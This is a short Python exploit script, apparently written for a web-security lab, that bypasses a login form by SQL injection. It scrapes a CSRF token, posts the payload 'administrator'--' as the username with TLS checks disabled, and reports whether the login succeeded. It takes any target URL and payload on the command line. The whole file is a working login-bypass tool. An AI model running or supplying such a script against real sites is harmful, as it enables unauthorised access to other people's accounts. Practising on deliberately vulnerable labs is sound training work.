#Problem statement -> SQL injection vulnerability allowing login bypass
#Payload -> "administrator'--"

import requests
import sys
import  urllib3
from bs4 import BeautifulSoup
from colorama import Fore , Back , Style , init

#Defining colors
#init(autoreset=True)
magenta = Fore.MAGENTA
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,magenta)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

#func for csrf token

def get_csrf(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,"html.parser")
    csrf = soup.find("input",{"name":"csrf"})["value"]
    return csrf


def exploit_sqli(s,url,payload):
    csrf_token = get_csrf(s,url)
    dataa = {"csrf":csrf_token,
             "username":payload,
             "password":"randomtext"}
    res = s.post(url,data=dataa,verify=False,proxies=proxies)
    
    if "Log out" in res.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip() + "/login"
        payload = sys.argv[2].strip()
    except IndexError:
        print("[+] Usage : python3 {} <url> <payload>".format(sys.argv[0]))
        print("[+] Example : python3 {} <url> <payload> ".format(sys.argv[0]))
        sys.exit(-1)
    except KeyboardInterrupt:
        print("[+] Exploit stooped dur to Keyboard interrupt")    

    s=requests.session()
    if exploit_sqli(s,url,payload):
        print("SQL Injection is Successfull")
    else:
        print("SQL Injection is UnSuccessfull")
